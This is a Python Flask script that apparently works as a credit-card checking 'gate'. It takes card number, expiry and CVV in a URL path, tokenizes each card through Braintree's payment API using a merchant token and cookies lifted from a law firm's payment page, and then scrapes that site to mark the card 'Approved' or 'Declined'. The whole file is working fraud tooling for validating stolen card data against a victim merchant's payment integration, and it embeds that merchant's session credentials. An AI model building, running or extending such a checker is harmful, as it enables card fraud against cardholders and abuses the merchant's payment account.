from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
from datetime import datetime

app = Flask(__name__)

def validate_credit_card(cc_number, exp_month, exp_year, cvv):
    # Validate card number (basic Luhn check)
    def luhn_check(card_number):
        try:
            digits = [int(d) for d in str(card_number)]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(divmod(d * 2, 10))
            return checksum % 10 == 0
        except:
            return False

    errors = []
    
    # Card number validation
    if not cc_number.isdigit():
        errors.append("Invalid card number - must be digits only")
    elif not 13 <= len(cc_number) <= 19:
        errors.append("Invalid card number length")
    elif not luhn_check(cc_number):
        errors.append("Invalid card number (failed Luhn check)")
    
    # Expiration date validation
    try:
        exp_month_int = int(exp_month)
        exp_year_int = int(exp_year)
        
        if not (1 <= exp_month_int <= 12):
            errors.append("Invalid expiration month (must be 01-12)")
        
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if exp_year_int < current_year:
            errors.append("Your card is expired")
        elif exp_year_int == current_year and exp_month_int < current_month:
            errors.append("Your card is expired")
    except ValueError:
        errors.append("Invalid expiration date format")
    
    # CVV validation
    if not cvv.isdigit():
        errors.append("Invalid CVV - must be digits only")
    elif len(cvv) not in [3, 4]:
        errors.append("Invalid CVV length - must be 3 or 4 digits")
    
    return errors

def process_braintree_payment(cc_number, exp_month, exp_year, cvv, cardholder_name, postal_code):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTMxMTMyNDAsImp0aSI6ImU1NWUzYmNiLWMxNjMtNDE2Ny04YWYzLTJlNTkyZmNhOTliNSIsInN1YiI6IjI0azRranpxNDJ3YmhzaGQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjI0azRranpxNDJ3YmhzaGQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.BKKTWzMb48bm4eUCDffEb5u_GPbFfxmRgCc6L0-FIbi5brCJyIeXqWmm0CdkJuX8MoAYXjiCos2OQqIZOYjE1A',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'ab9558ec-afcc-455a-aee2-4d35afce1c59',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'cardholderName': cardholder_name,
                    'billingAddress': {
                        'postalCode': postal_code,
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    return response

def check_payment_status():
    cookies = {
        '__cf_bm': '4am8Y9LLkfxiOYdpq9aq4aP92iEXILoFNjWb7M8xzzo-1753026219-1.0.1.1-DU5w_vsn2ewkR7RaDEtWquaksvd8Usbwcb.xIhLFE99TRrq_RZ52cd5SUlfkJW.0BYXU5FLRPxXOLsXVMtImBQr_0OUgiDnaTnJdYfCp0Ps',
        '_cfuvid': '77AeAuCKxJ0qn3HpIrROi.CXgVWjRGVv.cm9QbdQ1qs-1753026219692-0.0.1.1-604800000',
        '_ga': 'GA1.1.563843616.1753026221',
        'pys_session_limit': 'true',
        'pys_start_session': 'true',
        'pys_first_visit': 'true',
        'pysTrafficSource': 'web.telegram.org',
        'pys_landing_page': 'https://www.dunhamlaw.com/tn/',
        'last_pysTrafficSource': 'web.telegram.org',
        'last_pys_landing_page': 'https://www.dunhamlaw.com/tn/',
        '_fbp': 'fb.1.1753026220905.1511045809',
        '_cq_duid': '1.1753026221.d17PJDY14T5DaJ0v',
        '_cq_suid': '1.1753026221.7lNXsfxIN7h4SZxw',
        'pbid': '12a1b0e6a59ada153d5fbc1f6780f22c1b9e619b7f848b41f04495651bd04e31',
        '_ga_YW9SMY28T6': 'GS2.1.s1753026220$o1$g1$t1753026840$j57$l0$h0',
        '_cq_pxg': '3|j6420684981371115675231',
        '_gcl_au': '1.1.48443482.1753026221.1348110179.1753026360.1753026917',
        '_ga_XTPJDD0J37': 'GS2.1.s1753026220$o1$g1$t1753026917$j60$l0$h138257846',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.dunhamlaw.com/payments/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    params = {
        'id': 'failure',
    }

    response = requests.get('https://www.dunhamlaw.com/payments/failure/', params=params, cookies=cookies, headers=headers)
    return response.text

def extract_payment_response(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    
    entry_content = soup.find('div', class_='entry-content')
    if entry_content:
        paragraphs = [p.get_text(strip=True) for p in entry_content.find_all('p')]
        response_message = " ".join(paragraphs)
        
        status = "Declined"
        success_keywords = ["successful", "processed successfully", "success", "transaction done", "payment done"]
        if any(keyword.lower() in response_message.lower() for keyword in success_keywords):
            status = "Approved"
        
        return {
            "response": response_message,
            "status": status
        }
    return {
        "response": "Unable to determine payment status",
        "status": "Error"
    }

@app.route('/gate=br/key=<key>/cc=<cc>')
def process_payment(key, cc):
    try:
        # Parse the credit card information
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                "response": "Invalid credit card format. Use CC|MM|YYYY|CVV",
                "status": "Error"
            })
        
        cc_number, exp_month, exp_year, cvv = cc_parts
        
        # Validate credit card details
        validation_errors = validate_credit_card(cc_number, exp_month, exp_year, cvv)
        if validation_errors:
            return jsonify({
                "response": ". ".join(validation_errors),
                "status": "Declined"
            })
        
        # Process payment through Braintree
        payment_response = process_braintree_payment(
            cc_number=cc_number,
            exp_month=exp_month,
            exp_year=exp_year,
            cvv=cvv,
            cardholder_name="Cardholder",
            postal_code="10001"
        )
        
        # Check payment status page
        status_page_html = check_payment_status()
        
        # Extract response from HTML
        result = extract_payment_response(status_page_html)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "response": f"Error processing payment: {str(e)}",
            "status": "Error"
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9858)
